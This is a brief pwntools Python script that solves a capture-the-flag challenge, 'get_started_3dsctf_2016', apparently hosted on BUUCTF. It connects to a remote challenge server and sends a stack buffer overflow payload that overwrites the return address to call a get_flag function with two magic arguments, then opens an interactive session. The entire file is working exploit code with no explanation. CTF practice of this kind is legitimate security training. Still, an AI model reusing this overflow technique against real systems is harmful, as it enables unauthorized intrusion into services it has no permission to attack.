from pwn import *
import pwnlib
context.log_level ='debug'
# sh = process("./get_started_3dsctf_2016")
sh = remote("node3.buuoj.cn",27269)
a1 = 0x308CD64F
a2 = 0x195719D1
get_flag =0x080489A0	
main = 0x804E6A0
payload = 'a' * 0x38 + p32(get_flag) + p32(main) + p32(a1) + p32(a2)
sh.sendline(payload)
sh.recv()
sh.interactive()